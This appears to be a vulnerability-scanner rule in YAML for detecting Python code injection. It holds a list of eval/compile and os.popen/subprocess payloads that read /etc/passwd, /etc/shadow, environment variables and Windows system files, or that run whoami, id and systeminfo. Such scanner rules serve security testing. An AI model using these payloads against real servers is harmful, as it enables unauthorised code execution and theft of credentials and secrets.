rule_name: Python Code Injection
description: "Detects Python code injection vulnerabilities enabling arbitrary code execution on Linux and Windows servers."

transform:
  query:
    transformations:
      - replace_all_values_one_by_one:
          - "eval(compile(\"\"\"for x in range(1):\n import os\n os.popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/passwd').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('subprocess').check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
          - "__import__('os').popen('cat /etc/passwd').read()"
          - "str(\"-\"*50),__import__('os').popen('cat /etc/passwd').read()"
          - "__import__('os').popen('id').read()"
          - "eval(compile(\"\"\"__import__('os').popen(r'id').read()\"\"\",'','single'))"
          - "__import__('os').popen('whoami').read()"
          - "eval(compile(\"\"\"__import__('os').popen(r'whoami').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'uname -a').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/hostname').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'cat /etc/shadow').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'ifconfig').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'env').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'type C:\\Windows\\win.ini').read()\"\"\",'','single'))"
          - "__import__('os').popen('type C:\\\\Windows\\\\win.ini').read()"
          - "eval(compile(\"\"\"__import__('subprocess').check_output(r'type C:\\Windows\\win.ini',shell=True)\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'type C:\\Windows\\System32\\drivers\\etc\\hosts').read()\"\"\",'','single'))"
          - "__import__('os').popen('type C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts').read()"
          - "eval(compile(\"\"\"__import__('os').popen(r'whoami').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'systeminfo').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'ipconfig').read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').popen(r'set').read()\"\"\",'','single'))"
          - "__import__('os').getcwd()"
          - "eval(compile(\"\"\"__import__('platform').node()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('platform').platform()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('socket').getfqdn()\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').listdir('/')\"\"\",'','single'))"
          - "eval(compile(\"\"\"__import__('os').listdir('C:\\\\')\"\"\",'','single'))"
          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.Popen(r'cat /etc/passwd',shell=True, stdout=subprocess.PIPE).stdout.read()\"\"\",'','single'))"
          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'cat /etc/passwd',shell=True)\"\"\",'','single'))"
          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'type C:\\Windows\\win.ini',shell=True)\"\"\",'','single'))"
          - "eval(compile(\"\"\"for x in range(1):\n import subprocess\n subprocess.check_output(r'whoami',shell=True)\"\"\",'','single'))"
